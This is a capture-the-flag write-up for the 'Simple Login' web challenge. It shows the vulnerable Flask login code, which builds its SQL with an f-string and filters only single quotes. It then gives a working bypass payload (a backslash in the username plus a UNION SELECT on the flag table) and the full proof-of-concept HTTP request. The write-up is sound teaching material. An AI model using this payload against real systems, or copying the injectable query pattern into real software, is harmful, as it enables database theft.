---
slug: "web-simple-login"
title: "Simple Login"
competition: "Alpacahack"
category: "Web"
difficulty: "Easy"
date: "2026-11-04"
updated: "2026-11-04"
summary: "SQL Injection, but we can't use single quote."
tags: ["SQLI","SQL INJECTION"]
status: "published"
flag: "Alpaca{SQLi_with0ut_5ingle_quot3s!}"
attachments: []
source: "https://claritys.web.id/writeups/web-simple-login"
---

# Simple Login

> SQL Injection, but we can't use single quote.

## Recon

We got these source code:

```jsx
~/ctf/alpacahack/web/simple-login
❯ tree                                                                                                                                                                        󰥔 08:42:17
.
├── compose.yaml
├── db
│   └── init.sql
└── web
    ├── app.py
    ├── Dockerfile
    ├── requirements.txt
    └── templates
        ├── index.html
        └── login.html

4 directories, 7 files
```

Let’s check the [app.py](http://app.py) first.

```python
app.py:
from flask import Flask, request, redirect, render_template
import pymysql.cursors
import os

def db():
    return pymysql.connect(
        host=os.environ["MYSQL_HOST"],
        user=os.environ["MYSQL_USER"],
        password=os.environ["MYSQL_PASSWORD"],
        database=os.environ["MYSQL_DATABASE"],
        charset="utf8mb4",
        cursorclass=pymysql.cursors.DictCursor,
    )

app = Flask(__name__)

@app.get("/")
def index():
    if "username" not in request.cookies:
        return redirect("/login")
    return render_template("index.html", username=request.cookies["username"])

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username is None or password is None:
            return "Missing required parameters", 400
        if len(username) > 64 or len(password) > 64:
            return "Too long parameters", 400
        if "'" in username or "'" in password:
            return "Do not try SQL injection 🤗", 400

        conn = None
        try:
            conn = db()
            with conn.cursor() as cursor:
                cursor.execute(
                    f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
                )
                user = cursor.fetchone()
        except Exception as e:
            return f"Error: {e}", 500
        finally:
            if conn is not None:
                conn.close()

        if user is None or "username" not in user:
            return "No user", 400

        response = redirect("/")
        response.set_cookie("username", user["username"])
        return response
    else:
        return render_template("login.html")
```

## Vulnerability

The program have already anticipated for SQL Injection attack at this snippet:

```python
        if "'" in username or "'" in password:
            return "Do not try SQL injection 🤗", 400
```

But the mistake is the program only `prohibit`single quote (`'`). So we can use `"` and other attack.

The second mistake is from this snippet

```python
            with conn.cursor() as cursor:
                cursor.execute(
                    f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
                )
                user = cursor.fetchone()
```

From that snippet, we can see that the program use `format string` (use `f""`). So we can use format string attack like `\`. Because `\` is used for **escape character**. So it can be use to make the next character to be treated as a normal character, not for SQL syntax.

In addition it’s give us a chance to take the flag from that vulnerability. Now lets see the db structure.

```python
USE chall;

DROP TABLE IF EXISTS flag;
CREATE TABLE IF NOT EXISTS flag (
    value VARCHAR(128) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

-- On the remote server, a real flag is inserted.
INSERT INTO flag (value) VALUES ('Alpaca{REDACTED}');

DROP TABLE IF EXISTS users;
CREATE TABLE IF NOT EXISTS users (
    username VARCHAR(16) PRIMARY KEY,
    password VARCHAR(16) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

INSERT INTO users (username, password) VALUES ('admin', 'pass');
INSERT INTO users (username, password) VALUES ('hacker', '1337'); 
```

We can se the flag is inserted in table named `flag`, and the name colomn name of the flag that we targeted is `value`. So our payload should aim for table `flag` and colomn `value`.

So can conclude the payload with that recon:

```python
username=\&password=UNION SELECT value, 1 FROM flag -- 
```

**In SQL, the UNION command is specifically designed to combine the results of two or more SELECT statements into a single result set.** That’s why we use UNION SELECT.

I tried to input the payload and it’s succeeded.

![image.png](/assets/uploads/788d6344-0360-4173-a53c-18528fae6319-image.png)

How the flag get printed? because there’s

```python
        response.set_cookie("username", user["username"])
```

at app.py.

So our payload changed the query into like this:

```python
SELECT * FROM users WHERE username = '\' AND password = 'UNION SELECT value, 1 FROM flag -- '
```

So we change the username to our flag and the password to `1`.

## PoC request

```
POST /login HTTP/1.1
Host: 34.170.146.252:29964
Content-Length: 55
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://34.170.146.252:29964
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.170.146.252:29964/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=\&password=UNION SELECT value, 1 FROM flag -- 
```
